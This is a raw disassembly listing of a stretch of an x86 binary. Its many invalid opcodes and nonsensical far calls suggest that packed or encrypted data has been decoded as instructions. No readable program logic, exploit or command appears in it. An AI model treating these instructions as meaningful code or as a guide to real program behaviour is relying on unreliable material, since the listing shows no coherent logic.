  41df9e:	xor    eax,0xd2ccba97
  41dfa3:	mov    edx,0x4789a3a4
  41dfa8:	fstp   QWORD PTR [esi]
  41dfaa:	adc    eax,0xa7d39c75
  41dfaf:	mov    eax,DWORD PTR [ebx-0x2a46d115]
  41dfb5:	(bad)  
  41dfb6:	push   ss
  41dfb7:	pushf  
  41dfb8:	retf   
  41dfb9:	popa   
  41dfba:	sub    BYTE PTR [ebx+0x61],bl
  41dfbd:	arpl   WORD PTR [ecx-0x4bf6aff4],sp
  41dfc3:	mov    edi,0x3b58f3de
  41dfc8:	mov    eax,0x962678b3
  41dfcd:	test   DWORD PTR [ebx+0x14],ecx
  41dfd0:	mov    al,ds:0x860291e2
  41dfd5:	fimul  DWORD PTR [esi+0x57]
  41dfd8:	retf   0xc01a
  41dfdb:	add    BYTE PTR [eax-0x10],bl
  41dfde:	loopne 0x41dfb8
  41dfe0:	and    bl,cl
  41dfe2:	scas   al,BYTE PTR es:[edi]
  41dfe3:	es dec esi
  41dfe5:	bound  ecx,QWORD PTR [eax-0xf]
  41dfe8:	daa    
  41dfe9:	std    
  41dfea:	jl     0x41df7e
  41dfec:	sub    BYTE PTR [edi-0x133111ce],0x2f
  41dff3:	jg     0x41dfd6
  41dff5:	(bad)  
  41dff6:	call   0xab98:0xe7e2a38a
  41dffd:	jp     0x41dfc6
  41dfff:	ins    DWORD PTR es:[edi],dx
  41e000:	in     al,0x9
  41e002:	leave  
  41e003:	enter  0x8363,0x21
  41e007:	loopne 0x41e007
  41e009:	stos   BYTE PTR es:[edi],al
  41e00a:	outs   dx,DWORD PTR ds:[esi]
  41e00b:	js     0x41e065
  41e00d:	jbe    0x41dfd7
  41e00f:	hlt    
  41e010:	mov    esp,0x5d2356d1
  41e015:	stos   BYTE PTR es:[edi],al
  41e016:	fsubr  QWORD PTR [ebp+ebx*8+0x6750ec65]
  41e01d:	cdq    
  41e01e:	xchg   ecx,eax
  41e01f:	adc    BYTE PTR [ecx+0x6e],ch
  41e022:	ds jl  0x41e026
  41e025:	mov    bh,0x1e
  41e027:	dec    esi
  41e028:	test   BYTE PTR [ebx-0x5b],dh
  41e02b:	jge    0x41e084
  41e02d:	pop    esp
  41e02e:	fcmovnb st,st(1)
  41e030:	mov    edx,0x76f4b4af
  41e035:	int3   
  41e036:	nop
  41e037:	das    
  41e038:	in     al,dx
  41e039:	ds pop esp
  41e03b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e03c:	push   ss
  41e03d:	adc    BYTE PTR [ebp+0x3a],bh
  41e040:	outs   dx,BYTE PTR ds:[esi]
  41e041:	cmp    bl,BYTE PTR [ebp+0x4ac23589]
  41e047:	lods   al,BYTE PTR ds:[esi]
  41e048:	out    0x67,eax
  41e04a:	pop    ss
  41e04b:	cmp    BYTE PTR [edx-0x6a892771],al
  41e051:	xchg   ecx,eax
  41e052:	inc    esp
  41e053:	stos   DWORD PTR es:[edi],eax
  41e054:	hlt    
  41e055:	xor    ebp,DWORD PTR [ecx+0x41]
  41e058:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e059:	dec    ebp
  41e05a:	mov    eax,0x7c6d4429
  41e05f:	sbb    esi,DWORD PTR [ecx+0x21]
  41e062:	adc    DWORD PTR [esi-0x20010136],esi
  41e068:	aad    0x3d
  41e06a:	sub    bh,BYTE PTR [esi-0x7a51b71]
  41e070:	jb     0x41e086
  41e072:	inc    edx
  41e073:	(bad)
  41e077:	inc    BYTE PTR ds:0xba6f437e
  41e07d:	mov    al,0x4c
  41e07f:	rcr    esp,0xbc
  41e082:	push   edx
  41e083:	popa   
  41e084:	mov    ecx,0x4b27bb1
  41e089:	xor    dh,al
  41e08b:	mov    esi,0x3f7cc211
  41e090:	inc    BYTE PTR [eax]
	...
  41e0f2:	add    BYTE PTR [eax],al
  41e0f4:	dec    edi
  41e0f5:	push   ebx
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	add    al,bl
  41e102:	or     eax,0x13ff82d
  41e107:	add    BYTE PTR ds:0x6c000001,al
  41e10d:	fist   WORD PTR [edi+eiz*2-0x703ba15]
  41e114:	or     eax,ebx
  41e116:	jbe    0x41e09d
  41e118:	sub    BYTE PTR [ecx-0x36],0xe6
  41e11c:	pusha  
  41e11d:	out    dx,al
  41e11e:	rcr    ebx,cl
  41e120:	jmp    0xed563ba3
  41e125:	data16 das 
  41e127:	cmp    DWORD PTR [esi+ebp*1-0x78],0x1dc02d74
  41e12f:	pop    edx
  41e130:	mov    dh,BYTE PTR [ebx-0x45]
  41e133:	xor    BYTE PTR [edi],ah
  41e135:	ss jae 0x41e1b7
  41e138:	ds jae 0x41e10e
  41e13b:	add    al,ah
  41e13d:	mov    DWORD PTR [ebx-0x27],esi
  41e140:	push   esp
  41e141:	jge    0x41e16f
  41e143:	ret    
  41e144:	xor    al,bl
  41e146:	xor    DWORD PTR [ebp-0x11b1c5cb],edx
  41e14c:	ds nop
  41e14e:	(bad)  
  41e14f:	cli    
  41e150:	jp     0x41e1c4
  41e152:	pop    es
  41e153:	dec    edx
  41e154:	call   0x5cb24413
  41e159:	int    0xb5
  41e15b:	pop    esp
  41e15c:	sbb    ch,BYTE PTR [edx+0x2f]
  41e15f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e160:	pop    ss
  41e161:	add    BYTE PTR [edi+ebx*8-0x5d],0x1b
  41e166:	cmc    
  41e167:	adc    DWORD PTR [esi-0x42],eax
  41e16a:	jmp    0x41e173
  41e16c:	test   BYTE PTR [esi],ch
  41e16e:	push   0xffffffa6
  41e170:	jecxz  0x41e1ce
  41e172:	dec    ecx
  41e173:	mov    eax,0x616024a8
  41e178:	ja     0x41e1ab
  41e17a:	cmp    cl,bh
  41e17c:	mov    al,0xc8
  41e17e:	std    
  41e17f:	dec    esi
  41e180:	fstp   DWORD PTR [ebx+0xa35a7e9]
  41e186:	xchg   ebx,eax
  41e187:	inc    edx
  41e188:	mov    eax,0x855f141
  41e18d:	(bad)  
  41e18e:	jmp    0x41e175
  41e190:	psubusb mm3,QWORD PTR [eax+0xd]
  41e194:	inc    edi
  41e195:	aas    
  41e196:	ficomp WORD PTR [esi]
  41e198:	mov    esp,0x901beea4
  41e19d:	xchg   ebp,ebp
  41e19f:	mov    ch,0x60
  41e1a1:	dec    esi
  41e1a2:	test   DWORD PTR [ecx+ebx*2-0x2f85a510],eax
  41e1a9:	or     eax,0xf4a80537
  41e1ae:	push   ecx
  41e1af:	and    BYTE PTR ds:0x6050c2af,bh
  41e1b5:	mov    ch,dh
  41e1b7:	jb     0x41e180
  41e1b9:	inc    edx
  41e1ba:	pop    ebp
  41e1bb:	sbb    dl,al
  41e1bd:	jmp    0xfcda60e7
  41e1c2:	mov    bh,0x4b
  41e1c4:	test   al,0xc9
  41e1c6:	data16 mov dl,0x2a
  41e1c9:	dec    ebx
  41e1ca:	dec    edx
  41e1cb:	mov    WORD PTR [edx+0x35163f74],?
  41e1d1:	sbb    DWORD PTR [esi],0x2d
  41e1d4:	mov    ch,0xad
  41e1d6:	psubusb mm2,QWORD PTR [esi]
  41e1d9:	add    ecx,esp
  41e1db:	or     bh,0x26
  41e1de:	mov    dh,0xed
  41e1e0:	cmp    BYTE PTR [ecx+0x3dfb655],al
  41e1e6:	and    al,0x9c
  41e1e8:	out    0x33,eax
  41e1ea:	das    
  41e1eb:	std    
  41e1ec:	(bad)  
  41e1ed:	loopne 0x41e228
  41e1ef:	scas   al,BYTE PTR es:[edi]
  41e1f0:	sub    esi,DWORD PTR [ecx-0xda5f2b8]
  41e1f6:	cmp    DWORD PTR [edx+0x6c9e5ac7],ecx
  41e1fc:	jbe    0x41e1df
  41e1fe:	inc    ecx
  41e1ff:	and    DWORD PTR [esi],edi
  41e201:	xchg   DWORD PTR [ecx],ebp
  41e203:	test   DWORD PTR [edx-0xdbb67d0],0x63e22139
  41e20d:	test   BYTE PTR [esi+0x39],bh
  41e210:	push   esp
	...
  41e271:	add    BYTE PTR [eax],al
  41e273:	add    BYTE PTR [ebx-0x1988fe],ch
  41e279:	idiv   DWORD PTR [ebx+0x6f64c34f]
  41e27f:	or     al,0xc0
  41e281:	xchg   ebx,eax
  41e282:	out    dx,al
  41e283:	mov    ebp,?
  41e285:	inc    eax
  41e286:	add    DWORD PTR [eax],eax
  41e288:	add    eax,0x62000001
  41e28d:	idiv   BYTE PTR [ebp-0x185dffe9]
  41e293:	mov    ah,BYTE PTR [edx+0x71]
  41e296:	outs   dx,BYTE PTR ds:[esi]
  41e297:	push   0xffffff89
  41e299:	push   ecx
  41e29a:	mov    ah,0xd
  41e29c:	jmp    0xf997:0xfcd0e178
  41e2a3:	or     bl,dl
  41e2a5:	mov    cl,0xee
  41e2a7:	jge    0x41e2e0
  41e2a9:	call   0x28a2:0x40b559d4
  41e2b0:	pop    ss
  41e2b1:	lds    esi,FWORD PTR gs:[ecx]
  41e2b4:	adc    al,0xc4
  41e2b6:	ficomp DWORD PTR ds:0x9f0b5ff0
  41e2bc:	push   eax
  41e2bd:	xchg   edx,esi
  41e2bf:	cli    
  41e2c0:	add    ecx,DWORD PTR es:[edi-0x1ba287c]
  41e2c7:	push   0xaa9e24a4
  41e2cc:	in     al,dx
  41e2cd:	adc    dh,BYTE PTR [edi-0x62e28bda]
  41e2d3:	sub    eax,0x68fc3781
  41e2d8:	push   esi
  41e2d9:	retf   
  41e2da:	jo     0x41e30c
  41e2dc:	sbb    DWORD PTR [edi+ebp*1],ebp
  41e2df:	(bad)  
  41e2e0:	mov    cl,dl
  41e2e2:	jecxz  0x41e31d
  41e2e4:	js     0x41e321
  41e2e6:	(bad)  
  41e2e7:	repnz cli 
  41e2e9:	sub    eax,0xd89bd5f9
  41e2ee:	call   0xb82a:0xf9b010fb
  41e2f5:	inc    esi
  41e2f6:	das    
  41e2f7:	iret   
  41e2f8:	mov    esi,0x913ef33e
  41e2fd:	and    DWORD PTR [esi],0x34f3e2be
  41e303:	stos   BYTE PTR es:[edi],al
  41e304:	mov    dl,0x37
  41e306:	mov    bh,0xcc
  41e308:	inc    edx
  41e309:	jmp    0x41e29c
  41e30b:	pop    ss
  41e30c:	push   ecx
  41e30d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e30e:	dec    esp
  41e30f:	and    ecx,ecx
  41e311:	cmp    dh,dl
  41e313:	ja     0x41e390
  41e315:	or     DWORD PTR [ecx],ebp
  41e317:	imul   edx,DWORD PTR [esi-0x6a],0xc4ae9021
  41e31e:	(bad)
  41e323:	stos   DWORD PTR es:[edi],eax
  41e324:	jno    0x41e3a5
  41e326:	hlt    
  41e327:	test   DWORD PTR [esi+0x200f9361],esi
  41e32d:	jg     0x41e2c5
  41e32f:	pusha  
  41e330:	mov    al,ds:0x29e9c918
  41e335:	cdq    
  41e336:	stos   DWORD PTR es:[edi],eax
  41e337:	add    ah,BYTE PTR [eax-0x2d]
  41e33a:	mov    al,0x23
  41e33c:	jge    0x41e39d
  41e33e:	adc    eax,0xd6da97a7
  41e343:	inc    ebp
  41e344:	ja     0x41e306
  41e346:	jmp    ecx
  41e348:	xchg   esp,eax
  41e349:	popf   
  41e34a:	xor    esi,esi
  41e34c:	out    dx,eax
  41e34d:	fmul   QWORD PTR [eax+0xd]
  41e350:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e351:	jmp    0x41e3b9
  41e353:	(bad)  
  41e354:	(bad)  
  41e355:	cs mov edx,0xfcf3865c
  41e35b:	xlat   BYTE PTR ds:[ebx]
  41e35c:	pop    edx
  41e35d:	sub    BYTE PTR [eax-0x51eefb03],dl
  41e363:	sub    eax,0xb2d391ce
  41e368:	addr16 ja 0x41e33e
  41e36b:	pop    ds
  41e36c:	mov    ch,0x65
  41e36e:	mov    edx,0x95f60fa1
  41e373:	cmc    
  41e374:	or     dl,BYTE PTR [edx+0xb31d538]
  41e37a:	pop    eax
  41e37b:	pop    edi
  41e37c:	(bad)  [esi+0x77]
  41e37f:	ins    DWORD PTR es:[edi],dx
  41e380:	mov    al,0x7f
  41e382:	cmp    edi,esp
  41e384:	mov    edx,0xa07e187a
  41e389:	inc    ebp
  41e38a:	mov    al,ds:0x5dd4bce6
  41e38f:	jp     0x41e3d7
	...
  41e3f1:	add    BYTE PTR [eax],al
  41e3f3:	add    BYTE PTR [ecx-0xe088ee],cl
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0xadcade09
  41e403:	cmp    al,BYTE PTR [edx]
  41e405:	inc    edx
  41e406:	add    DWORD PTR [eax],eax
  41e408:	add    eax,0xfd000001
  41e40d:	in     eax,dx
  41e40e:	add    DWORD PTR [ebp-0x10],ecx
  41e411:	ins    DWORD PTR es:[edi],dx
  41e412:	and    DWORD PTR [edx+0x4d16bc51],esp
  41e418:	outs   dx,BYTE PTR ds:[esi]
  41e419:	sbb    bh,0x11
  41e41c:	ds aam 0x3a
  41e41f:	mov    eax,ds:0x99bae8d7
  41e424:	jle    0x41e3e5
  41e426:	nop
  41e427:	and    al,0x8b
  41e429:	or     eax,0x53c42be7
  41e42e:	popf   
  41e42f:	mov    dl,0xb0
  41e431:	mov    ah,ch
  41e433:	pusha  
  41e434:	xchg   esi,eax
  41e435:	es test al,0xd5
  41e438:	pushf  
  41e439:	cmp    al,0x29
  41e43b:	sub    edi,ebp
  41e43d:	call   0x83a3:0x26f462c6
  41e444:	pop    edx
  41e445:	mov    bl,0x2a
  41e447:	outs   dx,BYTE PTR ds:[esi]
  41e448:	mov    edi,0x4a306f5e
  41e44d:	mov    ecx,0x3f2ba639
  41e452:	and    BYTE PTR [ebx-0x645f3b2],0x14
  41e459:	cmp    al,0x10
  41e45b:	loop   0x41e4ab
  41e45d:	jg     0x41e4c1
  41e45f:	dec    eax
  41e460:	push   es
  41e461:	cmp    edx,DWORD PTR [esi+0x1]
  41e464:	call   0x9361b6c2
  41e469:	jp     0x41e48b
  41e46b:	push   ebp
  41e46c:	cmp    al,0x5f
  41e46e:	pop    esp
  41e46f:	mov    bl,bl
  41e471:	jle    0x41e447
  41e473:	loop   0x41e481
  41e475:	xchg   DWORD PTR [ecx-0x7],esi
  41e478:	std    
  41e479:	xor    BYTE PTR [eax+0x34d4c178],ch
  41e47f:	push   eax
  41e480:	push   esi
  41e481:	imul   edx,DWORD PTR [ebp-0x21],0xffffffd8
  41e485:	add    cl,BYTE PTR [ebx-0x13132098]
  41e48b:	outs   dx,BYTE PTR ds:[esi]
  41e48c:	stos   BYTE PTR es:[edi],al
  41e48d:	xchg   BYTE PTR [eax-0x4d038b7],bl
  41e493:	mov    esi,0xb7b2c3c7
  41e498:	push   es
  41e499:	cld    
  41e49a:	pushaw 
  41e49c:	ficom  WORD PTR ds:0xe255d330
  41e4a2:	dec    edx
  41e4a3:	dec    ebp
  41e4a4:	sbb    dl,BYTE PTR [ebx+0x6c]
  41e4a7:	shl    DWORD PTR [ebx],cl
  41e4a9:	mov    eax,0xb3ecd031
  41e4ae:	fs ja  0x41e46c
  41e4b1:	in     eax,0x84
  41e4b3:	sub    eax,0xb2e2ec92
  41e4b8:	cmc    
  41e4b9:	mul    BYTE PTR [ecx+edi*4+0x73fead9f]
  41e4c0:	dec    edi
  41e4c1:	lock jnp 0x41e50c
  41e4c4:	pop    ecx
  41e4c5:	sahf   
  41e4c6:	jp     0x41e531
  41e4c8:	add    al,ch
  41e4ca:	cld    
  41e4cb:	jle    0x41e532
  41e4cd:	fimul  WORD PTR [ebx]
  41e4cf:	div    DWORD PTR [ecx]
  41e4d1:	icebp  
  41e4d2:	adc    edx,ebx
  41e4d4:	cdq    
  41e4d5:	out    0xb4,eax
  41e4d7:	or     eax,0x6ae3490c
  41e4dc:	xchg   DWORD PTR [ebp+eiz*2+0x1b],ebx
  41e4e0:	xchg   ecx,eax
  41e4e1:	push   cs
  41e4e2:	mov    ebp,0xab602f87
  41e4e7:	stc    
  41e4e8:	loope  0x41e490
  41e4ea:	shr    DWORD PTR [eax-0x63947408],0xd1
  41e4f1:	cld    
  41e4f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4f3:	inc    ebp
  41e4f4:	rcr    BYTE PTR [ebx],1
  41e4f6:	push   ebp
  41e4f7:	ret    
  41e4f8:	pop    ebx
  41e4f9:	dec    esi
  41e4fa:	dec    edi
  41e4fb:	lahf   
  41e4fc:	lds    eax,FWORD PTR [ebp+0x4b]
  41e4ff:	pop    ds
  41e500:	xchg   esi,eax
  41e501:	mov    WORD PTR [eax],fs
  41e503:	daa    
  41e504:	aad    0x60
  41e506:	das    
  41e507:	push   edi
  41e508:	clc    
  41e509:	xor    bl,BYTE PTR [ebx+ecx*1-0x39]
  41e50d:	addr16 jp 0x41e4f6
  41e510:	push   edx
	...
  41e571:	add    BYTE PTR [eax],al
  41e573:	add    BYTE PTR [eax],ah
  41e575:	push   0xffffffcb
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e504
  41e581:	xchg   ecx,eax
  41e582:	cli    
  41e583:	cld    
  41e584:	pop    es
  41e585:	inc    ebx
  41e586:	add    DWORD PTR [eax],eax
  41e588:	add    eax,0x60000001
  41e58d:	(bad)  
  41e58e:	(bad)  
  41e590:	in     eax,dx
  41e591:	ds add dh,dh
  41e594:	adc    esp,DWORD PTR [eax]
  41e596:	push   edi
  41e597:	or     al,0xfa
  41e599:	sar    DWORD PTR [eax-0x67de9f2d],1
  41e59f:	scas   eax,DWORD PTR es:[edi]
  41e5a0:	mov    bl,0xdb
  41e5a2:	push   esi
  41e5a3:	xor    edx,DWORD PTR [edi+esi*8-0x18]
  41e5a7:	and    BYTE PTR [esi-0x2f],bl
  41e5aa:	daa    
  41e5ab:	rol    DWORD PTR [esi],cl
  41e5ad:	test   DWORD PTR [eax+0x30d49cf0],ebp
  41e5b3:	push   ds
  41e5b4:	add    BYTE PTR [esp+edi*1+0x650d665c],0xce
  41e5bc:	xchg   esp,eax
  41e5bd:	or     DWORD PTR [esi],esp
  41e5bf:	aaa    
  41e5c0:	pop    edx
  41e5c1:	inc    ebx
  41e5c2:	pop    edx
  41e5c3:	pop    edi
  41e5c4:	lods   al,BYTE PTR ds:[esi]
  41e5c5:	sub    ebx,DWORD PTR [esi-0x54]
  41e5c8:	(bad)  
  41e5c9:	fsubrp st(6),st
  41e5cb:	bound  esp,QWORD PTR [esi]
  41e5cd:	ror    DWORD PTR [ebx+edi*2],1
  41e5d0:	arpl   WORD PTR [ebx],bx
  41e5d2:	stc    
  41e5d3:	in     al,dx
  41e5d4:	bound  esp,QWORD PTR [ebx+0x5d]
  41e5d7:	jle    0x41e5dd
  41e5d9:	xchg   edx,eax
  41e5da:	jecxz  0x41e58b
  41e5dc:	sub    DWORD PTR ds:0xa8a81e65,edi
  41e5e2:	push   edi
  41e5e3:	mov    eax,ds:0x99fcef93
  41e5e8:	jle    0x41e59f
  41e5ea:	jl     0x41e5f2
  41e5ec:	cmp    DWORD PTR [ecx+0x1f],0xffffffd2
  41e5f0:	pop    ebp
  41e5f1:	push   edx
  41e5f2:	sub    edi,ecx
  41e5f4:	and    ebx,DWORD PTR [edi-0x45]
  41e5f7:	outs   dx,DWORD PTR ds:[esi]
  41e5f8:	add    bl,cl
  41e5fa:	pop    edi
  41e5fb:	imul   esp,DWORD PTR [eax-0x4f],0xfffffffb
  41e5ff:	call   0xbc35a29d
  41e604:	mov    ecx,0xa7f29522
  41e609:	push   ecx
  41e60a:	cld    
  41e60b:	pushf  
  41e60c:	mov    dl,0x58
  41e60e:	mov    ebp,0xe405fba8
  41e613:	daa    
  41e614:	ja     0x41e662
  41e616:	pushf  
  41e617:	push   ds
  41e618:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e619:	loop   0x41e611
  41e61b:	push   ecx
  41e61c:	mov    bh,0xf7
  41e61e:	je     0x41e622
  41e620:	mov    es,WORD PTR [edi-0x60]
  41e623:	push   ebx
  41e624:	or     eax,0xf38bae56
  41e629:	je     0x41e5e7
  41e62b:	into   
  41e62c:	jmp    0x41e5fc
  41e62e:	xchg   ebp,eax
  41e62f:	adc    BYTE PTR [ebx+edi*2-0x46d3fd35],ah
  41e636:	xchg   ecx,eax
  41e637:	aam    0x55
  41e639:	add    esi,DWORD PTR [ebp+0x5]
  41e63c:	fstp   TBYTE PTR [ecx]
  41e63e:	sub    ecx,eax
  41e640:	pop    ebx
  41e641:	outs   dx,DWORD PTR ds:[esi]
  41e642:	es ret 0xd3b0
  41e646:	stos   DWORD PTR es:[edi],eax
  41e647:	test   eax,0xea8bdf42
  41e64c:	mov    bl,0xb4
  41e64e:	jae    0x41e5d6
  41e650:	test   eax,0xd6ef38f0
  41e655:	pushf  
  41e656:	out    0xa6,eax
  41e658:	out    dx,eax
  41e659:	ja     0x41e622
  41e65b:	jns    0x41e64e
  41e65d:	mov    ebx,0xcb7f7f84
  41e662:	mov    esi,DWORD PTR [ebx]
  41e664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e665:	pop    ebp
  41e666:	sbb    dh,BYTE PTR [eax+0x181ed282]
  41e66c:	add    eax,0x3fd7ed07
  41e671:	icebp  
  41e672:	mov    ds:0x2fb67b90,eax
  41e677:	(bad)  
  41e678:	call   0x53d25939
  41e67d:	sbb    edi,ebx
  41e67f:	sbb    edx,DWORD PTR [ecx+0x7a6f7c78]
  41e685:	fild   WORD PTR [edi+0x63]
  41e688:	jne    0x41e661
  41e68a:	cmp    edx,DWORD PTR [ebx+0x567aa2c4]
  41e690:	xchg   edx,eax
	...
  41e6f1:	add    BYTE PTR [eax],al
  41e6f3:	add    ch,al
  41e6f5:	cwde   
  41e6f6:	loope  0x41e74d
  41e6f8:	std    
  41e6f9:	jge    0x41e6f0
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    edx,DWORD PTR [ebx]
  41e701:	xor    bl,ah
  41e703:	(bad)  
  41e704:	or     al,0x44
  41e706:	add    DWORD PTR [eax],eax
  41e708:	add    eax,0x60000001
  41e70d:	out    dx,eax
  41e70e:	loop   0x41e707
  41e710:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e711:	pop    ecx
  41e712:	pushf  
  41e713:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e714:	fcom   QWORD PTR [ebp+0x24]
  41e717:	or     al,0x79
  41e719:	dec    esp
  41e71a:	mov    ah,cl
  41e71c:	jg     0x41e74e
  41e71e:	popa   
  41e71f:	push   esp
  41e720:	fist   WORD PTR [esi-0x481f3120]
  41e726:	out    0x6e,eax
  41e728:	inc    ebx
  41e729:	fucom  st(6)
  41e72b:	shl    BYTE PTR [edx+0x4a0b3597],1
  41e731:	push   ecx
  41e732:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e733:	mov    es,WORD PTR [edx+0x35]
  41e736:	or     ebp,esi
  41e738:	enter  0x98b2,0x38
  41e73c:	pop    esp
  41e73d:	aad    0xe4
  41e73f:	push   edx
  41e740:	jne    0x41e7a4
  41e742:	mov    eax,DWORD PTR [edx+eax*4-0x26]
  41e746:	pop    esi
  41e747:	adc    DWORD PTR [ecx],edx
  41e749:	mov    gs,WORD PTR [ecx+0x4acc972a]
  41e74f:	cmp    bl,BYTE PTR [ebp+0x6d588b9c]
  41e755:	aas    
  41e756:	push   0xf692255a
  41e75b:	mov    dl,ah
  41e75d:	pop    edi
  41e75e:	mov    cl,BYTE PTR ds:0xa4acfc0e
  41e764:	leave  
  41e765:	mov    ebx,0xaa10ce39
  41e76a:	and    dl,BYTE PTR [esi]
  41e76c:	das    
  41e76d:	and    al,0x31
  41e76f:	jne    0x41e6f6
  41e771:	cmp    DWORD PTR ds:0x13a5da49,eax
  41e777:	test   bh,bh
  41e779:	jb     0x41e766
  41e77b:	inc    ebp
  41e77c:	jae    0x41e785
  41e77e:	cmp    eax,0x59cc2e66
  41e783:	mov    eax,0xd24096ff
  41e788:	repz cdq 
  41e78a:	rcl    ebx,cl
  41e78c:	aam    0x98
  41e78e:	jecxz  0x41e800
  41e790:	jmp    0x9bd7019
  41e795:	cld    
  41e796:	addr16 inc eax
  41e798:	call   0xb4e0:0xc191fc0c
  41e79f:	add    ah,BYTE PTR [ebx+0x6eaa1c77]
  41e7a5:	xor    dl,BYTE PTR [edi+0x58]
  41e7a8:	inc    edx
  41e7a9:	fdivr  QWORD PTR [esi]
  41e7ab:	mov    ebp,0x853596b8
  41e7b0:	sbb    ah,ch
  41e7b2:	dec    eax
  41e7b3:	and    bh,0xdb
  41e7b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7b7:	jno    0x41e7cb
  41e7b9:	les    ecx,FWORD PTR [ebx-0x5f]
  41e7bc:	pop    esi
  41e7bd:	mov    esi,0x2f16a1db
  41e7c2:	and    DWORD PTR [edi-0x4f7ffa4f],edi
  41e7c8:	jl     0x41e79d
  41e7ca:	ror    BYTE PTR [ecx],0x9d
  41e7cd:	or     al,0x14
  41e7cf:	jmp    DWORD PTR ds:0xa971e7b1
  41e7d5:	fistp  QWORD PTR [ecx]
  41e7d7:	jg     0x41e81f
  41e7d9:	jp     0x41e7d6
  41e7db:	int    0x75
  41e7dd:	mov    cl,0x59
  41e7df:	push   esi
  41e7e0:	xchg   DWORD PTR [edx],eax
  41e7e2:	cdq    
  41e7e3:	mov    ds:0xbef4c692,eax
  41e7e8:	mov    ds,eax
  41e7ea:	jle    0x41e81f
  41e7ec:	pop    edi
  41e7ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7ee:	sub    al,0x55
  41e7f0:	dec    esi
  41e7f1:	daa    
  41e7f2:	ins    BYTE PTR es:[edi],dx
  41e7f3:	enter  0xc3ee,0xea
  41e7f7:	cmc    
  41e7f8:	xchg   esp,eax
  41e7f9:	inc    ebx
  41e7fa:	test   BYTE PTR [edi-0x43],ch
  41e7fd:	sub    DWORD PTR [eax-0x4b02d884],edi
  41e803:	outs   dx,BYTE PTR ds:[esi]
  41e804:	(bad)
  41e807:	dec    esi
  41e808:	loop   0x41e886
  41e80a:	aaa    
  41e80b:	cdq    
  41e80c:	push   ebx
  41e80d:	inc    edx
  41e80e:	int    0xae
  41e810:	pushf  
	...
  41e871:	add    BYTE PTR [eax],al
  41e873:	add    BYTE PTR ds:0x9e5c8a39,ch
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e8e9
  41e881:	push   eax
  41e882:	sub    ecx,eax
  41e884:	adc    DWORD PTR [ebp+0x1],eax
  41e887:	add    BYTE PTR ds:0x4f000001,al
  41e88d:	inc    esp
  41e88e:	(bad)  
  41e88f:	ins    BYTE PTR es:[edi],dx
  41e890:	imul   ecx,DWORD PTR [edi],0xffffffe5
  41e893:	fbld   TBYTE PTR [ebx+0x2dbd5bb1]
  41e899:	and    al,BYTE PTR ds:0x8882939b
  41e89f:	mov    cl,0x4
  41e8a1:	cli    
  41e8a2:	stos   BYTE PTR es:[edi],al
  41e8a3:	or     BYTE PTR [edx-0x3dfca60e],bh
  41e8a9:	test   BYTE PTR [ebp+0x6a2599b9],dh
  41e8af:	mov    cl,BYTE PTR ds:0x2cf6ed8d
  41e8b5:	bound  edx,QWORD PTR [ebx]
  41e8b7:	push   edx
  41e8b8:	cmp    eax,0x37097a83
  41e8bd:	add    ah,BYTE PTR [ebx-0x8]
  41e8c0:	popf   
  41e8c1:	outs   dx,BYTE PTR ds:[esi]
  41e8c2:	jmp    0x5788:0xf4345805
  41e8c9:	cmc    
  41e8ca:	mov    ss,ecx
  41e8cc:	gs mov bl,0xc3
  41e8cf:	lods   eax,DWORD PTR ds:[esi]
  41e8d0:	(bad)  [eax-0x415f8819]
  41e8d6:	add    DWORD PTR [ebx-0x33],edi
  41e8d9:	mov    al,ds:0xa820f2cb
  41e8de:	cwde   
  41e8df:	inc    edx
  41e8e0:	adc    al,0x30
  41e8e2:	xchg   edx,eax
  41e8e3:	inc    bh
  41e8e5:	aas    
  41e8e6:	fcom   QWORD PTR [esp+edx*4+0x320cad28]
  41e8ed:	jne    0x41e8c5
  41e8ef:	mov    esi,0xf794ae54
  41e8f4:	in     al,dx
  41e8f5:	cmp    al,0x4c
  41e8f7:	sbb    al,0x25
  41e8f9:	mov    edx,0x868b124b
  41e8fe:	scas   eax,DWORD PTR es:[edi]
  41e8ff:	jge    0x41e903
  41e901:	out    dx,al
  41e902:	jne    0x41e8b2
  41e904:	and    DWORD PTR [edx+0x3d9749cc],ebp
  41e90a:	int3   
  41e90b:	and    eax,0x40000b38
  41e910:	ins    BYTE PTR es:[edi],dx
  41e911:	mov    dh,0xc2
  41e913:	in     al,0x19
  41e915:	push   ecx
  41e916:	and    BYTE PTR [ebp-0x34ff4b81],bl
  41e91c:	or     eax,0xe027b0fd
  41e921:	pop    edi
  41e922:	dec    esi
  41e923:	out    dx,al
  41e924:	not    ebp
  41e926:	xlat   BYTE PTR ds:[ebx]
  41e927:	pop    es
  41e928:	fbstp  TBYTE PTR [ebx+0x47]
  41e92b:	icebp  
  41e92c:	adc    dl,BYTE PTR [ebx]
  41e92e:	rcl    bl,1
  41e930:	push   ds
  41e931:	cmp    ah,BYTE PTR [eax-0xec53ab7]
  41e937:	xor    DWORD PTR [esi+0x6f],esi
  41e93a:	retf   
  41e93b:	into   
  41e93c:	(bad)  
  41e93e:	aad    0x49
